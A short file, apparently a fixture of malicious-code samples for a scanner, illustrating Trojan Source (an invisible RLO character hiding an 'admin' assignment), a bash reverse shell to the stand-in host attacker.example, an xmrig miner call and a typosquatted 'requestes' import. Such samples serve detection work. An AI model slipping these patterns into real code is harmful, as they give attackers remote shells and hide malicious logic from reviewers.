# Trojan Source sample (CVE-2021-42574). U+202E (RLO) is invisible in editors
# but reverses how the line is rendered.
‮ access_level = "admin"

# Reverse-shell + crypto miner signatures.
import socket
def evil():
    s = socket.socket()
    s.connect(("attacker.example", 4444))
    import os
    os.system("bash -i >& /dev/tcp/attacker.example/4444 0>&1")

def mine():
    from xmrig import miner  # crypto miner library
    miner.start()

import requestes  # typosquat of requests
